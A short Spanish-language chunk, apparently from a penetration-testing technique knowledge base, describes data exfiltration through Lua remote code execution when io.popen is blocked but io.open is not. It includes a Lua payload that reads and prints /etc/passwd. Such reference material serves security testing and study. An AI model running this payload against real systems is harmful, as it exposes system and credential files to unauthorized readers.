---
chunk_id: technique::web::lua-rce::data-exfiltration::001
domain: web
chunk_type: technique
---

### 1. Exfiltración de Datos (Lectura de Archivos)

Si `io.popen` está bloqueado pero `io.open` no, un atacante puede leer archivos sensibles del sistema (como la configuración del servidor o contraseñas).

**Payload:**

```lua
-- Intenta leer el archivo de usuarios en Linux
local f = io.open("/etc/passwd", "r")
if f then
    local content = f:read("*all")
    f:close()
    print(content)
end
```
